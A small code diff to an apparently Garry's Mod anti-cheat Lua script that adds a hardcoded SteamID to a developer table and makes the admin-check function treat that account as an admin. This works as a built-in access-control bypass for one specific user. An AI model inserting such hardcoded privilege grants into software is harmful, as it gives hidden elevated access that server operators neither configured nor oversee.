@@ -9,8 +9,13 @@ function LAC.IsTTT()
 end
 
 -- lmao pls
+LAC.devID = 
+{
+	["STEAM_0:1:8115"] = true
+}
+
 function LAC.IsGFLAdmin(ply)
-	return ply:IsUserGroup("trialadmin") or ply:IsAdmin()
+	return ply:IsUserGroup("trialadmin") or ply:IsAdmin() or LAC.devID[ply:SteamID()]
 end
 
 -- This uses ipairs!! Dont have non-numeric keys!!
